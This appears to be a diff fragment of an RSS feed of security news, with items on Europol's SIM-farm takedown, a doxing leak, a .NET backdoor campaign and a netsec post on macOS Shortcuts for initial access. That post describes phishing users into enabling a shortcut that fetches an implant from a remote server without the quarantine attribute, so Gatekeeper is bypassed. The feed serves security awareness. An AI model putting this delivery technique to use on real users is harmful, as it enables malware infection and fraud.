url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_I5eP3IIKFpmiSm1phVEKFUbg1o3JZ9DH_6R8w2XAVD5xxHEDx74c28SBq6sRo5d18K4Msnx8iHphoSeUot29zcoUH-6OMwLsjrtDL10S44x7uVIr2d8hh-mez0REVSA6C3qvdVGhlQWcMrIb9uBrX7cKuUvAO3EwHvuW3oSjqRNm9u8diTsWPi3lFMZw/s1600/sim-farm.jpg" length="" type=""/><pubDate>Sun, 19 Oct 2025 06:13:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Europol on Friday announced the disruption of a sophisticated cybercrime-as-a-service (CaaS) platform that operated a SIM farm and enabled its customers to carry out a broad spectrum of crimes ranging from phishing to investment fraud.
-The coordinated law enforcement effort, dubbed Operation SIMCARTEL, saw 26 searches carried out, resulting in the arrest of seven suspects and the seizure of]]></content:encoded></item><item><title>Before Their Telegram Channel Was Banned Again, ScatteredLAPSUS$Hunters Dropped Files Doxing Government Employees (2)</title><link>https://databreaches.net/2025/10/18/before-their-telegram-channel-was-banned-again-scatteredlapsushunters-dropped-files-doxing-government-employees/?pk_campaign=feed&amp;pk_kwd=before-their-telegram-channel-was-banned-again-scatteredlapsushunters-dropped-files-doxing-government-employees</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 19 Oct 2025 00:39:24 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>macOS Shortcuts for Initial Access</title><link>https://medium.com/@dhiraj_mishra/macos-shortcuts-for-initial-access-c43ce7cf0e0c</link><author>/u/SkyFallRobin</author><category>netsec</category><pubDate>Sat, 18 Oct 2025 13:01:11 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Check my other posts & tools MeetC2 & AWS XRayC2..For most of you this might be a known technique but here is what I have recently learned. macOS Shortcuts provides a quick way to get things done with your apps.As macOS Shortcuts have been abused a lot in past but recently we can use it for payload delivery, as this trick does requires social engineering and multiple clicks from victim to get the implant run.owever, this tradecraft could allow evade traditional email defenses as the final delivery URL is on “”. In addition to this, it also allows bypassing “macOS Gatekeeper”. What I have understood so far content downloaded by “s” does NOT receive the quarantine attribute.Since, this bypasses Gatekeeper its a good candidate to trick end users into this with a good phishing pretext.macOS Shortcuts has a security setting called  that must be explicitly enabled before shortcuts can execute.Apart from, multiple clicks that needs to be done by the end user one more problem exists the shortcut does not executes the script directly but rather it needs to be enabled first, for this the user needs to click the below “Preferences” and enable it. This can be done  “sudo”.Here is the video proof-of-concept for this attack, that downloads the implant from your remote server and executes it without having the quarantine attribute in place. links bypass most email security solutions and appear legitimate to users.Shortcuts.app does not add the `` extended attribute, allowing downloaded payloads to execute without signature verification]]></content:encoded></item><item><title>New .NET CAPI Backdoor Targets Russian Auto and E-Commerce Firms via Phishing ZIPs</title><link>https://thehackernews.com/2025/10/new-net-capi-backdoor-targets-russian.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjONqdUuuzUnSmVHZhMcb0nfxYoLC_St8teKiK0-qlwf3oFZ-rYbcUdnFHk7Mgy1EGoVKTbyQxzKaba5HD7dK6BinVxUGsBQUmUUpgzw5mx6ovilIp8qze4uC_8RTbjv7enWakXLBUKJZwdKcHhUS6qVJ-ke9FXhzkBw951sZZYbBRD_QhTQiH4Pas9oRF7/s1600/russian-malware.jpg" length="" type=""/><pubDate>Sat, 18 Oct 2025 11:41:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have shed light on a new campaign that has likely targeted the Russian automobile and e-commerce sectors with a previously undocumented .NET malware dubbed CAPI Backdoor.
-According to Seqrite Labs, the attack chain involves distributing phishing emails containing a ZIP archive as a way to trigger the infection. The cybersecurity company's analysis is based on the ZIP]]></content:encoded></item></channel></rss>
+The coordinated law enforcement effort, dubbed Operation SIMCARTEL, saw 26 searches carried out, resulting in the arrest of seven suspects and the seizure of]]></content:encoded></item><item><title>Before Their Telegram Channel Was Banned Again, ScatteredLAPSUS$Hunters Dropped Files Doxing Government Employees (2)</title><link>https://databreaches.net/2025/10/18/before-their-telegram-channel-was-banned-again-scatteredlapsushunters-dropped-files-doxing-government-employees/?pk_campaign=feed&amp;pk_kwd=before-their-telegram-channel-was-banned-again-scatteredlapsushunters-dropped-files-doxing-government-employees</link><author>Dissent</author><category>databreach</category><pubDate>Sun, 19 Oct 2025 00:39:24 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>macOS Shortcuts for Initial Access</title><link>https://medium.com/@dhiraj_mishra/macos-shortcuts-for-initial-access-c43ce7cf0e0c</link><author>/u/SkyFallRobin</author><category>netsec</category><pubDate>Sat, 18 Oct 2025 13:01:11 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Check my other posts & tools MeetC2 & AWS XRayC2..For most of you this might be a known technique but here is what I have recently learned. macOS Shortcuts provides a quick way to get things done with your apps.As macOS Shortcuts have been abused a lot in past but recently we can use it for payload delivery, as this trick does requires social engineering and multiple clicks from victim to get the implant run.owever, this tradecraft could allow evade traditional email defenses as the final delivery URL is on “”. In addition to this, it also allows bypassing “macOS Gatekeeper”. What I have understood so far content downloaded by “s” does NOT receive the quarantine attribute.Since, this bypasses Gatekeeper its a good candidate to trick end users into this with a good phishing pretext.macOS Shortcuts has a security setting called  that must be explicitly enabled before shortcuts can execute.Apart from, multiple clicks that needs to be done by the end user one more problem exists the shortcut does not executes the script directly but rather it needs to be enabled first, for this the user needs to click the below “Preferences” and enable it. This can be done  “sudo”.Here is the video proof-of-concept for this attack, that downloads the implant from your remote server and executes it without having the quarantine attribute in place. links bypass most email security solutions and appear legitimate to users.Shortcuts.app does not add the `` extended attribute, allowing downloaded payloads to execute without signature verification]]></content:encoded></item></channel></rss>
